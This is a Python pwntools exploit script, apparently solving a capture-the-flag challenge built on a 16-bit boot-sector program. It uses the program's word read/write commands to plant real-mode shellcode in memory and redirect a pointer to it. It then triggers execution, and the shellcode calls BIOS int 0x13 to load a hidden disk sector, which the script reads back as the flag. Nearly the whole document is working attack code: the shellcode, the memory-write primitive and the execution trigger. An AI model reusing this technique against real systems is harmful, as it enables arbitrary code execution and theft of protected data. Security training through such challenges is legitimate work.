from pwn import *

disk_path = "/tmp/boot.bin"
context.arch = "i386"

# io = process(["qemu-system-i386", "-s", "-display", "none", "-serial", "mon:stdio", disk_path])
io = remote("frp.athdesk.me", 11337)

# def dumpall():
#     def _dumpall():
#         while io.can_recv(timeout=0.1):
#             o = io.recvline(timeout=0.1).decode().strip()
#             if len(o) == 0:
#                 break
#             print(o)

#     _dumpall()
#     _dumpall()

def rl():
    return io.recvuntil(b"\r\n").strip()

def sl(b):
    io.send(b + b"\r")
    # echo
    n = len(b) + 1
    while n > 0:
        n -= len(io.recv(1))


def write_word(what, to):
    # to is an address [0x0000, 0xffff]
    # we have to send an offset from 0x6000, divided by 2
    # because we are writing 2 bytes at a time
    # so we have to send (to - 0x6000) / 2
    slot = ((to - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"w {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    io.recvuntil(b"hexword]> ")

    target_val = hex(what)[2:].rjust(4, "0")
    info(f"Sending {target_val} -> {target_slot}")
    sl(target_val.encode())

def read_word(from_):
    slot = ((from_ - 0x6000) % 0xffff) // 2
    target_slot = hex(slot)[2:].rjust(4, "0")
    cmd = f"r {target_slot}".encode()

    io.recvuntil(b"> ")
    sl(cmd)
    rl()
    ss = rl()
    info(f"Reading {target_slot} -> {ss.decode()}")
    return int(ss.decode(), 16)


def write_contiguous(pl, to=0x6000):
    word_list = []
    for i in range(0, len(pl), 2):
        word_list.append(u16(pl[i:i+2]))
    for w in word_list:
        write_word(w, to)
        to += 2

def comm_test():
    io.recvuntil(b"> ")
    sl(b"R 0000")
    rl()
    ss = rl()
    info(ss.decode())

    io.recvuntil(b"> ")
    sl(b"W 0000")
    io.recvuntil(b"hexword]> ")
    sl(b"dead")

    io.recvuntil(b"> ")
    sl(b"R 0000")
    rl()
    ss = rl()
    info(ss.decode())
    input()

# This real mode 16-bits shellcode will read the second sector of the disk using BIOS Apis
# https://stanislavs.org/helppc/int_13-2.html

shellcode = """
; org 0x6000
bits 16

mov ah, 2
mov al, 1
mov bx, 0x7020 ; <- target address
mov cx, 0x0002     ; <- cyl:sector
mov dx, 0x0080    ; <- head:disk number ( or 0x80 to indicate hdd and not floppy)
int 0x13

ret
"""

open("shellcode.S", "w").write(shellcode)
info("Assembling shellcode...")
os.system("nasm -f bin shellcode.S -o /tmp/payload")
payload = open("/tmp/payload", "rb").read()
write_contiguous(payload)
write_word(0x6000, 0x6900)

# execute the shellcode
io.recvuntil(b"> ")
sl(b"X 6900")


# read the flag word by word

flag = b""
for i in range(0x7020, 0x7020 + 0x100, 2):
    x = p16(read_word(i))
    if x == b"\x00\x00":
        break
    flag += x

info(f"Flag: {flag}")

input()
